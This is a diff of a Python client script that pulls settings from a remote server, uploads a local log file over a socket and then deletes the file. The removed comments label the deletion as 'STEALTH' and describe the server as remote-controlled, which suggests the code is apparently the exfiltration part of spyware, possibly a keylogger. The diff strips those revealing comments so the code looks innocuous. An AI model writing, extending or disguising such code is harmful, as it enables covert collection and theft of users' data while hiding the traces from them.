@@ -3,11 +3,10 @@ import socket
 import platform
 import json
 
-# SERVER CONNECTION
-SERVER_IP = "localhost"  # Change to actual server IP
+SERVER_IP = "localhost" 
 SERVER_PORT = 9999
 
-# Default configuration (will be overridden by server)
+# Default configuration 
 CONFIG = {
     'send_interval': 10,
     'buffer_size': 1024,
@@ -27,22 +26,22 @@ def get_config_from_server():
         s.settimeout(5)
         s.connect((SERVER_IP, SERVER_PORT))
         
-        # Send 'C' to indicate config request
+        # config request
         s.send(b'C')
         
-        # Receive config JSON
+        # Receive config
         config_data = s.recv(1024).decode('utf-8')
         s.close()
         
-        # Parse and update config
+        # update config
         server_config = json.loads(config_data)
         CONFIG.update(server_config)
         
-        print(f"✓ Received config from server: send_interval={CONFIG['send_interval']}s")
+        print(f"Received config from server: send_interval={CONFIG['send_interval']}s")
         return True
         
     except Exception as e:
-        print(f"⚠ Could not get config from server: {e}")
+        print(f"Could not get config from server: {e}")
         print(f"  Using default: send_interval={CONFIG['send_interval']}s")
         return False
 
@@ -53,7 +52,7 @@ def send_logs():
         s.settimeout(5)
         s.connect((SERVER_IP, SERVER_PORT))
         
-        # Send 'L' to indicate log upload
+        # log upload
         s.send(b'L')
         
         # Check if log file exists
@@ -72,7 +71,7 @@ def send_logs():
         
         s.close()
         
-        # Delete the log file after successful send (STEALTH)
+        # Delete the log file
         try:
             os.remove(log_file)
             print("Logs sent and deleted successfully")
